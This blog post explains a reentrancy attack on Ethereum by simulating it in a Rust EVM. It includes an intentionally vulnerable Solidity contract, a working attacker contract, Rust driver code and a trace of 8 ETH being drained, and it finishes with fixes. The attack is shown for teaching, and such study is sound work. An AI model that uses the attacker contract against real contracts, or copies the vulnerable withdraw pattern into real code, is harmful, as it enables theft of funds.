---
layout: post
title: "EVM Reentrancy Attack Simulation"
date: 2026-03-07 17:46:00 +0100
categories: solidity rust ethereum DAO-hack reentrancy
---

TL/DR: [reentrancy.rs](https://github.com/sergey-melnychuk/solenoid/blob/main/examples/reentrancy.rs) — a classic reentrancy attack simulated end-to-end inside [solenoid](https://github.com/sergey-melnychuk/solenoid), running real Solidity contracts in-process completely locally. 8 ETH drained, full execution trace, no testnet required.

---

Most reentrancy writeups show you the vulnerable contract and say "trust me, this is what happens." This one shows you — balance by balance, frame by frame, in Rust.

## The Vulnerability

The bug is simple. A contract sends ETH to the caller *before* updating its own state:

```solidity
contract Vulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance >= 1 ether);
        (bool ok, ) = msg.sender.call{value: balance}("");  // <-- sends ETH here
        require(ok);
        balances[msg.sender] = 0; // <-- updates state here (too late)
    }
}
```

The window between the external call and the state update is the attack surface. Any contract receiving ETH can execute arbitrary code before `balances[msg.sender] = 0` runs. If it calls `withdraw()` again — the balance check still passes, because nothing has changed yet.

This is the [Checks-Effects-Interactions](https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy) pattern violation. The fix is to zero the balance *before* sending ETH. The history is the [DAO hack (2016)](https://www.coindesk.com/learn/understanding-the-dao-attack/) — $60M drained by exactly this mechanism, consequential enough to split Ethereum into ETH and ETC.

## The Attacker

```solidity
contract Attacker {
    address private target;
    uint256 private limit;

    function attack(address _target) public payable {
        target = _target;
        limit = msg.value;
        Vulnerable(target).deposit{value: limit}();
        Vulnerable(target).withdraw();           // kicks off the chain
    }

    fallback() external payable {
        if (address(target).balance >= limit) {  // vault still has ETH?
            Vulnerable(target).withdraw();       // re-enter before balance clears
        }
    }
}
```

Three steps:

1. Deposit `limit` ETH into `Vulnerable` — establishes a legitimate balance.
2. Call `withdraw()` — `Vulnerable` sends ETH back, triggering the `fallback`.
3. Inside `fallback`: if `Vulnerable` still holds ETH, call `withdraw()` again.

Because `balances[attacker]` was never zeroed, the `require` passes every time. The recursion continues until `Vulnerable.balance < limit`. On the way out, each stack frame executes `balances[attacker] = 0` — an assignment, not a subtraction, so it's harmless at any depth. The attacker entered with 1 ETH and exits with all of it plus whatever the vault held.

## Why Simulate It in Solenoid

Testing this in Foundry or Hardhat is straightforward. But those tools treat the EVM as a black box — you see inputs and outputs, not the execution state mid-call.

[Solenoid](https://github.com/sergey-melnychuk/solenoid) is a Rust EVM implementation I built from scratch. It forks mainnet state lazily via JSON-RPC and runs contracts entirely in-process (though this example runs fully locally without it). That means you can inspect what the EVM is actually doing at every step: call depth, balance changes per frame, storage reads and writes as they happen.

For something like reentrancy — where the interesting thing is the *sequence* of state changes across nested calls — running it inside the EVM implementation rather than on top of it makes the mechanics visible rather than inferred.

## The Simulation

Three actors, two contracts:

- `cc` deploys `Vulnerable`
- `bb` deposits 8 ETH (the prize)
- `aa` deploys `Attacker` and executes the attack with 1 ETH

```rust
// Fund actors, deploy contracts, innocent deposit
let _ = Solenoid::new()
    .execute(target, "deposit()", &[])
    .with_sender(bb)
    .with_gas(Word::from(1_000_000))
    .with_value(one * Word::from(8))   // 8 ETH from bb
    .ready()
    .apply(&mut ext)
    .await?;
```

State before the attack:

```
Target balance: 8.0 ETH
Attack balance: 0.0 ETH
```

The attack call:

```rust
let r = Solenoid::new()
    .execute(attack, "attack(address)", &target.as_word().into_bytes())
    .with_sender(aa)
    .with_gas(Word::from(1_000_000))
    .with_value(one)                   // 1 ETH from aa
    .ready()
    .apply(&mut ext)
    .await?;
```

What happens inside the EVM during this single transaction. The trace below filters out only call/return & balance change events.

```
$ETH: HACKER: 1.0 ETH (-1.0 ETH)
$ETH: ATTACK: 3.0 ETH (+1.0 ETH)
Call: HACKER -> ATTACK [1.0 ETH]
$ETH: ATTACK: 0.0 ETH (-1.0 ETH)
$ETH: TARGET: 9.0 ETH (+1.0 ETH)
.Call: ATTACK -> TARGET [1.0 ETH]
.Exit: ok=true gas=22438
.Call: ATTACK -> TARGET
.$ETH: TARGET: 8.0 ETH (-1.0 ETH)
.$ETH: ATTACK: 1.0 ETH (+1.0 ETH)
..Call: TARGET -> ATTACK [1.0 ETH]
...Call: ATTACK -> TARGET
...$ETH: TARGET: 7.0 ETH (-1.0 ETH)
...$ETH: ATTACK: 2.0 ETH (+1.0 ETH)
....Call: TARGET -> ATTACK [1.0 ETH]
.....Call: ATTACK -> TARGET
.....$ETH: TARGET: 6.0 ETH (-1.0 ETH)
.....$ETH: ATTACK: 3.0 ETH (+1.0 ETH)
......Call: TARGET -> ATTACK [1.0 ETH]
.......Call: ATTACK -> TARGET
.......$ETH: TARGET: 5.0 ETH (-1.0 ETH)
.......$ETH: ATTACK: 4.0 ETH (+1.0 ETH)
........Call: TARGET -> ATTACK [1.0 ETH]
.........Call: ATTACK -> TARGET
.........$ETH: TARGET: 4.0 ETH (-1.0 ETH)
.........$ETH: ATTACK: 5.0 ETH (+1.0 ETH)
..........Call: TARGET -> ATTACK [1.0 ETH]
...........Call: ATTACK -> TARGET
...........$ETH: TARGET: 3.0 ETH (-1.0 ETH)
...........$ETH: ATTACK: 6.0 ETH (+1.0 ETH)
............Call: TARGET -> ATTACK [1.0 ETH]
.............Call: ATTACK -> TARGET
.............$ETH: TARGET: 2.0 ETH (-1.0 ETH)
.............$ETH: ATTACK: 7.0 ETH (+1.0 ETH)
..............Call: TARGET -> ATTACK [1.0 ETH]
...............Call: ATTACK -> TARGET
...............$ETH: TARGET: 1.0 ETH (-1.0 ETH)
...............$ETH: ATTACK: 8.0 ETH (+1.0 ETH)
................Call: TARGET -> ATTACK [1.0 ETH]
.................Call: ATTACK -> TARGET
.................$ETH: TARGET: 0.0 ETH (-1.0 ETH)
.................$ETH: ATTACK: 9.0 ETH (+1.0 ETH)
..................Call: TARGET -> ATTACK [1.0 ETH]
..................Exit: ok=true gas=368
.................Exit: ok=true gas=7800
................Exit: ok=true gas=8621
...............Exit: ok=true gas=16053
..............Exit: ok=true gas=16874
.............Exit: ok=true gas=24306
............Exit: ok=true gas=25127
...........Exit: ok=true gas=32559
..........Exit: ok=true gas=33380
.........Exit: ok=true gas=40812
........Exit: ok=true gas=41633
.......Exit: ok=true gas=49065
......Exit: ok=true gas=49886
.....Exit: ok=true gas=57318
....Exit: ok=true gas=58139
...Exit: ok=true gas=65571
..Exit: ok=true gas=66392
.Exit: ok=true gas=73824
Exit: ok=true gas=148091
```

9 pairs of recursive `withdraw() + fallback()` calls make total 18 nested calls, `balances[attacker] = 0` executes 9 times on the way out of `withdraw()` — harmless each time because it's an idempotent assignment.

State after:

```
Target balance: 0.0 ETH
Attack balance: 9.0 ETH
```

`bb`'s 8 ETH, plus `aa`'s original 1 ETH, now sit in the `Attacker` contract. `Vulnerable` is empty.

## The Fix

**Checks-Effects-Interactions** — zero the balance before sending ETH:

```solidity
function withdraw() public {
    uint256 balance = balances[msg.sender];
    require(balance >= 1 ether);
    balances[msg.sender] = 0;                           // effect first
    (bool ok, ) = msg.sender.call{value: balance}("");  // interaction second
    require(ok);
}
```

Now when the attacker's `fallback` re-enters `withdraw()`, `balances[attacker]` is already 0. The `require` fails. Recursion stops after the first call.

**Reentrancy guard** — a mutex that reverts any re-entrant call:

```solidity
bool private locked;

modifier nonReentrant() {
    require(!locked, "reentrant call");
    locked = true;
    _;
    locked = false;
}

function withdraw() public nonReentrant { ... }
```

OpenZeppelin's [`ReentrancyGuard`](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) does this with less footgun potential. Use it.

CEI is the canonical fix. The guard is a safety net. The pull pattern is the safest design if you can afford the UX tradeoff.

## Running It

```bash
git clone https://github.com/sergey-melnychuk/solenoid
cd solenoid
cargo run --example reentrancy
```

There is no need for any JSON-RPC endpoint for the example to work, balances are patched and necessary contracts are deployed completely locally, so the real network is not even touched. The contracts are pre-compiled; Solidity lives in `etc/reentrancy/setup.sol` next to the bytecode. If you want to modify the Solidity and recompile, `solc` with `--bin` and `--bin-runtime` flags produces the right output.

---

The full example: [reentrancy.rs](https://github.com/sergey-melnychuk/solenoid/blob/main/examples/reentrancy.rs) & [setup.sol](https://github.com/sergey-melnychuk/solenoid/blob/main/etc/reentrancy/setup.sol).

The EVM it runs on: [solenoid](https://github.com/sergey-melnychuk/solenoid)
